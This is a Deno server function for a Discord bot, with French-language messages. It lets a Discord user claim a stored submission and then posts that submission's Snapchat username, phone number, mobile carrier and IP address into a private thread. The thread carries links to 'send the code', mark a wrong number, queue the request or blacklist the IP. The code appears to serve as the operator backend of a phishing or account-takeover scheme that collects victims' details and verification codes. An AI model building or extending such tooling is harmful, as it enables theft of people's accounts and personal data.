import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

function hexToBytes(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.slice(i, i + 2), 16);
  }
  return bytes;
}

async function verifySignature(req, bodyText) {
  const sig = req.headers.get("X-Signature-Ed25519");
  const ts = req.headers.get("X-Signature-Timestamp");
  const pubKey = Deno.env.get("DISCORD_PUBLIC_KEY");
  if (!sig || !ts || !pubKey) return false;
  try {
    const key = await crypto.subtle.importKey("raw", hexToBytes(pubKey), { name: "Ed25519" }, false, ["verify"]);
    const msg = new TextEncoder().encode(ts + bodyText);
    return await crypto.subtle.verify("Ed25519", key, hexToBytes(sig), msg);
  } catch {
    return false;
  }
}

async function botAPI(endpoint, method = "GET", body = null) {
  const res = await fetch(`https://discord.com/api/v10${endpoint}`, {
    method,
    headers: {
      "Authorization": `Bot ${Deno.env.get("DISCORD_BOT_TOKEN")}`,
      "Content-Type": "application/json"
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  if (!res.ok) throw new Error(`Discord ${res.status}: ${text}`);
  return text ? JSON.parse(text) : {};
}

Deno.serve(async (req) => {
  const bodyText = await req.text();

  if (!await verifySignature(req, bodyText)) {
    return new Response("Invalid signature", { status: 401 });
  }

  const body = JSON.parse(bodyText);

  // Discord PING handshake
  if (body.type === 1) return Response.json({ type: 1 });

  // Button click
  if (body.type === 3 && body.data?.custom_id?.startsWith("claim_")) {
    const submissionId = body.data.custom_id.replace("claim_", "");
    const userId = body.member?.user?.id || body.user?.id;
    const username = body.member?.user?.username || body.user?.username;
    const channelId = body.channel_id;
    const messageId = body.message?.id;

    const base44 = createClientFromRequest(req);

    // Fetch submission
    let sub;
    try {
      sub = await base44.asServiceRole.entities.Submission.get(submissionId);
    } catch {
      return Response.json({ type: 4, data: { content: "❌ Soumission introuvable.", flags: 64 } });
    }

    // Already claimed?
    if (sub.claimed_by_discord_id) {
      return Response.json({ type: 4, data: { content: "⚠️ Cette demande a déjà été prise en charge.", flags: 64 } });
    }

    // Claim it atomically
    await base44.asServiceRole.entities.Submission.update(submissionId, { claimed_by_discord_id: userId });

    // Race condition check
    const updated = await base44.asServiceRole.entities.Submission.get(submissionId);
    if (updated.claimed_by_discord_id !== userId) {
      return Response.json({ type: 4, data: { content: "⚡ Quelqu'un d'autre l'a pris juste avant vous !", flags: 64 } });
    }

    const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";

    const threadContent =
      `# 🔐 Demande prise en charge\n` +
      `**👻 Snapchat:** @${sub.snapchat || "N/A"}\n` +
      `**📞 Téléphone:** ${sub.telephone || "N/A"}\n` +
      `**📡 Opérateur:** ${sub.operateur || "N/A"}\n\n` +
      `## Actions disponibles\n` +
      `✅ [**Envoyer le code**](${appUrl}/?trigger=${submissionId})\n` +
      `❌ [**Mauvais numéro**](${appUrl}/?triggerAction=wrong&id=${submissionId})\n` +
      `⏳ [**File d'attente**](${appUrl}/?triggerAction=wait&id=${submissionId})\n` +
      `🚫 [**Blacklist**](${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(sub.ip_address || "")})`;

    // Create private thread from the message
    try {
      const thread = await botAPI(`/channels/${channelId}/messages/${messageId}/threads`, "POST", {
        name: `📋 ${sub.snapchat || "Demande"} — ${sub.operateur || ""}`,
        auto_archive_duration: 60
      });

      // Add the claiming user to the thread
      await botAPI(`/channels/${thread.id}/thread-members/${userId}`, "PUT");

      // Post the action links in the thread
      await botAPI(`/channels/${thread.id}/messages`, "POST", { content: threadContent });

      // Disable the button on the original message
      await botAPI(`/channels/${channelId}/messages/${messageId}`, "PATCH", {
        components: [{
          type: 1,
          components: [{
            type: 2,
            style: 2,
            label: `✅ Pris par @${username}`,
            custom_id: "claimed_done",
            disabled: true
          }]
        }]
      });

      return Response.json({ type: 4, data: { content: `✅ Thread créé ! <#${thread.id}>`, flags: 64 } });
    } catch (e) {
      console.error("Thread creation failed:", e.message);

      // Fallback: DM
      try {
        const dm = await botAPI("/users/@me/channels", "POST", { recipient_id: userId });
        await botAPI(`/channels/${dm.id}/messages`, "POST", { content: threadContent });
        return Response.json({ type: 4, data: { content: "✅ Pris en charge ! Vérifiez vos DMs.", flags: 64 } });
      } catch (e2) {
        console.error("DM failed:", e2.message);
        return Response.json({ type: 4, data: { content: "✅ Pris en charge, mais impossible de créer le thread.", flags: 64 } });
      }
    }
  }

  return Response.json({ type: 1 });
});